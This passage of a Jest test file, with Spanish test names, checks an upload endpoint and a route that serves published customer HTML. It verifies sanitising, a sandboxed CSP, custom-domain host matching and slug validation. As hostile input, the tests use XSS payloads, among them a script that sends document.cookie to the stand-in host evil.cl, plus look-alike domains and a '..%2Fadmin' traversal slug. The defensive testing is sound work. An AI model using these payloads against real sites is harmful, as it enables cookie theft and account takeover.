    expect(del).toHaveBeenCalledTimes(1);
    expect(jest.mocked(captureException).mock.calls[0]![0]).toEqual(expect.objectContaining({ message: 'P1001 base caída' }));
  });

  it('en el camino feliz no se borra nada del almacenamiento', async () => {
    allowedSite();
    await uploadPOST(upload());
    expect(del).not.toHaveBeenCalled();
  });

  it.each([
    ['sin siteId', { siteId: null }],
    ['sin archivo', { file: false }],
    ['archivo vacío', { content: new Uint8Array(0) }],
  ])('%s: 400 sin subir ni consultar', async (_label, options) => {
    allowedSite();
    const res = await uploadPOST(upload(options));
    expect(res.status).toBe(400);
    expect(put).not.toHaveBeenCalled();
    expect(db.webSite.findFirst).not.toHaveBeenCalled();
  });

  it('si el almacenamiento falla: 500 genérico, se reporta y no se registra el asset', async () => {
    allowedSite();
    jest.mocked(put).mockRejectedValue(new Error('R2 AccessDenied bucket=secreto'));

    const res = await uploadPOST(upload());
    const json = await res.json();

    expect(res.status).toBe(500);
    expect(json.error).not.toMatch(/R2|bucket|secreto/);
    expect(captureException).toHaveBeenCalledTimes(1);
    expect(db.webSiteAsset.create).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// GET /web/[slug]/raw
// ---------------------------------------------------------------------------

describe('GET /web/[slug]/raw', () => {
  const DIRTY = [
    '<h1 onclick="robar()">Hola</h1>',
    '<script>document.location="https://evil.cl/?c="+document.cookie</script>',
    '<img src="https://cdn.cl/a.jpg" onerror="alert(1)" alt="foto">',
    '<a href="javascript:alert(1)">clic</a>',
    '<iframe src="https://evil.cl"></iframe>',
    '<form action="https://evil.cl"><input name="pw"></form>',
    '<p>Texto normal del sitio</p>',
  ].join('\n');

  const ctx = (slug = 'solar-sur') => ({ params: Promise.resolve({ slug }) });
  const get = (slug = 'solar-sur') => rawGET(new Request(`https://app.test/web/${slug}/raw`), ctx(slug));

  it('sitio HTML publicado: 200 con CSP sandbox sin scripts, nosniff, y cuerpo sin <script> aunque publishedHtml lo traiga', async () => {
    db.webSite.findUnique.mockResolvedValue(publicRow({ mode: 'HTML', publishedBlocks: [], publishedHtml: DIRTY }));

    const res = await get();
    const body = await res.text();

    expect(res.status).toBe(200);
    const csp = res.headers.get('Content-Security-Policy')!;
    expect(csp).toContain('sandbox');
    expect(csp).toContain("script-src 'none'");
    expect(csp).not.toContain('allow-scripts');
    expect(csp).not.toContain('allow-same-origin');
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(res.headers.get('X-Content-Type-Options')).toBe('nosniff');
    expect(res.headers.get('Content-Type')).toMatch(/^text\/html/);
    expect(res.headers.get('X-Robots-Tag')).toBe('noindex');
    expect(res.headers.get('Referrer-Policy')).toBe('no-referrer');

    // Segunda barrera: se vuelve a sanear al servir.
    expect(body).not.toMatch(/<script/i);
    expect(body).not.toMatch(/onclick|onerror/i);
    expect(body).not.toMatch(/javascript:/i);
    expect(body).not.toMatch(/<iframe|<form|<input/i);
    expect(body).toContain('<h1>Hola</h1>');
    expect(body).toContain('<p>Texto normal del sitio</p>');
  });

  it('envuelve el contenido con el título y la descripción del sitio, escapados', async () => {
    db.webSite.findUnique.mockResolvedValue(
      publicRow({ mode: 'HTML', publishedBlocks: [], publishedHtml: '<p>hola</p>', seoTitle: 'Solar "Sur" <b>', seoDescription: 'Paneles & más' })
    );

    const body = await (await get()).text();

    expect(body).toContain('<title>Solar &quot;Sur&quot; &lt;b&gt;</title>');
    expect(body).toContain('content="Paneles &amp; más"');
    expect(body).toContain('<p>hola</p>');
  });

  it('consulta por slug y nunca sirve el borrador (la selección pública no incluye draftHtml)', async () => {
    db.webSite.findUnique.mockResolvedValue(publicRow({ mode: 'HTML', publishedBlocks: [], publishedHtml: '<p>publicado</p>', draftHtml: '<p>BORRADOR</p>' }));

    const body = await (await get()).text();

    expect(argsOf(db.webSite.findUnique).where).toEqual({ slug: 'solar-sur' });
    expect(argsOf(db.webSite.findUnique).select).not.toHaveProperty('draftHtml');
    expect(body).toContain('publicado');
    expect(body).not.toContain('BORRADOR');
  });

  it('sitio guiado: 404 con noindex y texto plano (no HTML)', async () => {
    db.webSite.findUnique.mockResolvedValue(publicRow({ mode: 'GUIDED' }));

    const res = await get();

    expect(res.status).toBe(404);
    expect(res.headers.get('X-Robots-Tag')).toBe('noindex');
    expect(res.headers.get('Content-Type')).toMatch(/^text\/plain/);
  });

  it('sitio inexistente: 404 con noindex', async () => {
    db.webSite.findUnique.mockResolvedValue(null);

    const res = await get('no-existe');

    expect(res.status).toBe(404);
    expect(res.headers.get('X-Robots-Tag')).toBe('noindex');
  });

  it.each([
    ['borrador', { status: 'DRAFT' }],
    ['archivado', { status: 'ARCHIVED' }],
    ['empresa suspendida', { company: { businessName: 'X', status: 'SUSPENDED', features: { hasWebSites: true } } }],
    ['empresa cancelada', { company: { businessName: 'X', status: 'CANCELLED', features: { hasWebSites: true } } }],
    ['empresa sin el módulo', { company: { businessName: 'X', status: 'ACTIVE', features: { hasWebSites: false } } }],
  ])('sitio HTML no visible (%s): 404 y no se filtra el HTML', async (_label, over) => {
    db.webSite.findUnique.mockResolvedValue(publicRow({ mode: 'HTML', publishedBlocks: [], publishedHtml: '<p>SECRETO</p>', ...over }));

    const res = await get();

    expect(res.status).toBe(404);
    expect(await res.text()).not.toContain('SECRETO');
    expect(res.headers.get('Content-Security-Policy')).toBeNull();
  });

  describe('por dominio propio solo se sirve el sitio DE ESE dominio', () => {
    const ORIGINAL_APP_URL = process.env.APP_URL;
    beforeAll(() => {
      process.env.APP_URL = 'https://erp.aether.cl';
    });
    afterAll(() => {
      if (ORIGINAL_APP_URL === undefined) delete process.env.APP_URL;
      else process.env.APP_URL = ORIGINAL_APP_URL;
    });

    const htmlSite = (over: Row = {}) => publicRow({ mode: 'HTML', publishedBlocks: [], publishedHtml: '<p>CONTENIDO DEL CLIENTE</p>', customDomain: 'mio.cl', ...over });
    const getVia = (host: string, slug = 'solar-sur') =>
      rawGET(new Request(`https://${host}/web/${slug}/raw`, { headers: { host } }), ctx(slug));

    it('el host de otro dominio propio NO puede mostrar el HTML de un sitio ajeno: 404 con noindex y sin filtrar el contenido', async () => {
      db.webSite.findUnique.mockResolvedValue(htmlSite());

      const res = await getVia('otro.cl');

      expect(res.status).toBe(404);
      expect(res.headers.get('X-Robots-Tag')).toBe('noindex');
      expect(res.headers.get('Content-Type')).toMatch(/^text\/plain/);
      expect(await res.text()).not.toContain('CONTENIDO DEL CLIENTE');
    });

    it('un dominio propio tampoco sirve un sitio que no tiene dominio propio', async () => {
      db.webSite.findUnique.mockResolvedValue(htmlSite({ customDomain: null }));
      const res = await getVia('otro.cl');
      expect(res.status).toBe(404);
    });

    it.each(['mio.cl', 'www.mio.cl', 'MIO.CL', 'mio.cl:443'])('el host %s, que coincide con el customDomain del sitio, sirve el documento', async (host) => {
      db.webSite.findUnique.mockResolvedValue(htmlSite());

      const res = await getVia(host);

      expect(res.status).toBe(200);
      expect(await res.text()).toContain('CONTENIDO DEL CLIENTE');
      expect(res.headers.get('Content-Security-Policy')).toContain("script-src 'none'");
    });

    it('un subdominio parecido (evil-mio.cl, mio.cl.evil.com, sub.mio.cl) no se confunde con el dominio del sitio', async () => {
      for (const host of ['evil-mio.cl', 'mio.cl.evil.com', 'sub.mio.cl']) {
        db.webSite.findUnique.mockResolvedValue(htmlSite());
        const res = await getVia(host);
        expect({ host, status: res.status }).toEqual({ host, status: 404 });
      }
    });

    it.each([
      ['el host de la plataforma (APP_URL)', 'erp.aether.cl'],
      ['www de la plataforma', 'www.erp.aether.cl'],
      ['localhost', 'localhost:3000'],
      ['un despliegue *.vercel.app', 'erp-abc.vercel.app'],
    ])('en %s sirve cualquier sitio HTML publicado, con o sin dominio propio', async (_label, host) => {
      db.webSite.findUnique.mockResolvedValueOnce(htmlSite());
      expect((await getVia(host)).status).toBe(200);

      db.webSite.findUnique.mockResolvedValueOnce(htmlSite({ customDomain: null }));
      expect((await getVia(host)).status).toBe(200);
    });

    it('sin cabecera Host se trata como plataforma (mismo criterio que el proxy)', async () => {
      db.webSite.findUnique.mockResolvedValue(htmlSite());
      const res = await rawGET(new Request('https://erp.aether.cl/web/solar-sur/raw'), ctx());
      expect(res.status).toBe(200);
    });
  });

  it('slug con formato inválido: 404 sin consultar la base', async () => {
    const res = await get('..%2Fadmin');
    expect(res.status).toBe(404);
    expectNoDbAccess(db);
  });
});
